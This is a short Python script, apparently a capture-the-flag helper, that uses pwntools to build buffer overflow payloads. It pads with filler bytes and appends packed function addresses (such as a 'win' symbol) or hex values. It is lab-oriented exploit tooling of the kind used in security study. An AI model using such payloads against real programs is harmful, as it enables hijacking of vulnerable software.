from pwn import *
from termcolor import colored, cprint

# ***------------------------------***
#  This script is used to create a 
#  payload dynamically in multiple
#  possible formats. A payload with
#  multiple parameters can be made
#  as well as a payload with just
#  filler data. It is built using 
#  user input so that any combination
#  can be made for various tasks.
# ***------------------------------***

def build():
	cprint( "\nEnter the", "yellow", end=" ")
	cprint( "amount of filler bytes", "red", attrs=["bold","underline"], end=" ")
	cprint( "to test (ex 100)", "yellow")
	fillerlength = input()
	fillerlength = int(fillerlength)
	
	payload = b''
	if fillerlength != 0:
		payload += b'A' * fillerlength
	
	getting_input = True
	while getting_input:
	
		cprint( "Append Function or Hex Data? (F or H | N for No)", "yellow")
		user_choice = input()
		
		if user_choice.upper() == "N":
			getting_input = False
			break
		
		elif user_choice.upper() == "F":
			cprint( "Enter the", "yellow", end=" ")
			cprint( "File Path", "red", attrs=["bold","underline"], end=" ")
			cprint( "to search (ex files/bof3)", "yellow")
			file_path = input()
			
			cprint( "Enter any", "yellow", end=" ")
			cprint( "Function Name", "red", attrs=["bold","underline"], end=" ")
			cprint( "to append (ex win | N if none)", "yellow")
			suffix = input()
			
			elf = ELF(file_path)
			suffix = elf.symbols[suffix]
			#print(function_suffix)
			elf.close()
			
		elif user_choice.upper() == "H":
			cprint( "Enter any", "yellow", end=" ")
			cprint( "Hex Data Suffix", "red", attrs=["bold","underline"], end=" ")
			cprint( "(ex deadbeef | N if none))", "yellow")
			suffix = input()
			suffix = int( suffix, 16 )
		
		payload += p32(suffix)
	
	print("\nHere is your payload!\n", payload)



#build()
